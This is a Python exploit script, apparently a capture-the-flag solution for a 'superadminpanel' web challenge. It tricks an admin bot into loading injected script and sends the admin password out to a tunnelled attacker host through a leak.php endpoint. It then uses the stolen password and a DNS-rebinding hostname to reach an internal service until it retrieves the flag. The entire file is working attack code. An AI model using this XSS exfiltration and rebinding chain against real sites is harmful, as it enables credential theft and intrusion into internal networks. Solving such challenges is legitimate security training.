#!/bin/python3
import base64
import logging
import os
import time
from urllib.parse import urlparse, parse_qs

import requests
import tunnel

logging.disable()


URL = os.environ.get("URL", "http://superadminpanel.challs.teamitaly.eu")
if URL.endswith("/"):
    URL = URL[:-1]

TEMPLATE_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')


def read_file(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    except FileNotFoundError:
        return f"File '{file_path}' not found."
    except Exception as e:
        return f"An error occurred: {str(e)}"


with tunnel.open_http_tunnel() as t:
    ngrok_url = f'http://{t.remote_host}:{t.remote_port}'
    attack_url = ngrok_url + '/exploit.html'
    leak_url = ngrok_url + '/leak.php?password='

    exploit_js = read_file(os.path.join(TEMPLATE_DIRECTORY, 'exploit.js')).replace("{LEAK_URL}", leak_url)

    b64_exploit = base64.b64encode(("<script>" + exploit_js + "</script>").encode('utf-8')).decode('utf-8')
    exploit_html = read_file(os.path.join(TEMPLATE_DIRECTORY, 'exploit.html')).replace("{URL}", URL).replace(
        "{ATTACK_URL}", attack_url).replace("{EXPLOIT_BASE64}", b64_exploit)

    r = requests.post(URL + "/report", data={"url": attack_url}, timeout=3)
    r.raise_for_status()
    assert r.text == "Admin will visit"

    t.wait_request()
    t.send_response(200, {'Content-Type': 'text/html'}, exploit_html.encode())

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    path = urlparse(path)
    query = parse_qs(path.query)

    password = query.get('password')[0]
    print(password)

    r = requests.post(URL + "/panel", cookies={"passw": password}, timeout=2)
    r.raise_for_status()
    assert "Test website functionality" in r.text

    while True:
        try:
            x = requests.post(URL + "/panel", cookies={"passw": password},
                              data={"link": "http://7f000001.c0a80001.rbndr.us:1337/"},
                              timeout=2)
            if "Hackers not allowed" in x.text:
                print(".", end="", flush=True)

            if "Content: " in x.text:
                flag = x.text.split("Content: ")[1].split("<")[0]
                print(flag, end="\n", flush=True)
                break

            time.sleep(0.2)
        except:
            print("!", end="", flush=True)
